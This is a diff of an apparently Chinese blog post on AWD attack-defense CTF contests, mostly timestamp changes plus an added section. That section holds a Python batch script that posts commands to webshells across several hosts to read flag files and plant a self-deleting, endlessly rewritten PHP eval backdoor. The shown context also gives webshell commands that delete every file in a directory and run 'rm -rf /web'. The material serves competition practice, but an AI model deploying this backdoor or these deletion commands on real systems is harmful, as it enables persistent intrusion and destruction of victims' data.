@@ -19,7 +19,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://i.loli.net/2019/09/06/lEocGHKeD4CkIvB.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/06/CvQ3q7xn49TYf8A.png">
-<meta property="og:updated_time" content="2019-09-10T09:11:52.574Z">
+<meta property="og:updated_time" content="2019-09-10T14:46:45.678Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="AWD">
 <meta name="twitter:description" content="AWD简介AWD攻防战,出题方会给每个队伍部署同样环境的主机，每个队伍的主机里都有flag，攻击别人的靶机以取得别人的flag提交来得分，本机的flag被别人提交会被扣分。因此要在攻击别人的机器的同时要防御好自己的机器避免被别人攻破。也就是真正的攻防实战.">
@@ -30,7 +30,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1568106720263">
+  <link rel="stylesheet" href="/css/style.css?v=1568126828780">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -141,7 +141,7 @@
     </div>
   <div class="nexmoe-post-meta">
     <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月10日</a>
-    <a><i class="nexmoefont icon-areachart"></i>454 字</a>
+    <a><i class="nexmoefont icon-areachart"></i>561 字</a>
     <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
     
     
@@ -187,7 +187,27 @@ while(true) {
 <h5 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h5><p>刚刚拿到的webshell可以拿来上传不死马也可以拿来做其他的操作，例如删除网站或者删除一下文件</p>
 <h6 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h6><p>使用global语法删除文件<br><code>array_map(&#39;unlink&#39;, glob(&#39;*&#39;));</code></p>
 <h6 id="删除网站"><a href="#删除网站" class="headerlink" title="删除网站"></a>删除网站</h6><p>使用system调用系统命令<br><code>system（&#39;cd ../../../ &amp;&amp; rm -rf /web&#39;）</code></p>
-
+<h5 id="批量化脚本"><a href="#批量化脚本" class="headerlink" title="批量化脚本"></a>批量化脚本</h5><pre><code>import requests
+url = &quot;http://192.168.238.132:880&quot;
+shell = &quot;/shell.php&quot;
+passwd = &quot;aaa&quot;
+port = &quot;&quot;
+payload = {passwd: &#39;system(\&#39;cat /flag\&#39;);&#39;}
+payload2 = {shell: &#39;ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = &#39;2.php&#39;;$code = &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;){@eval($_POST[a]);} ?&gt;&#39;;while (1){file_put_contents($file,$code);usleep(5000);}&#39;}
+for i in range(1,6):
+    url1 = url+str(i)+shell
+    try:
+        r=requests.post(url1,payload,timeout=1)
+        if(r.status_code==requests.codes.ok):
+            print(url1+&quot; flag is :&quot;+r.text)
+        else:
+            print(&quot;web connect failed&quot;)
+    except:
+        print(&quot;shell connect failed&quot;)
+    try:
+        r=requests.post(url1,payload2,timeout=1)
+    except:
+        print(&quot;shell insert failed&quot;)</code></pre>
   </article>
   
     
@@ -234,7 +254,7 @@ while(true) {
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1568106720271"></script>
+<script src="/js/app.js?v=1568126828790"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
   
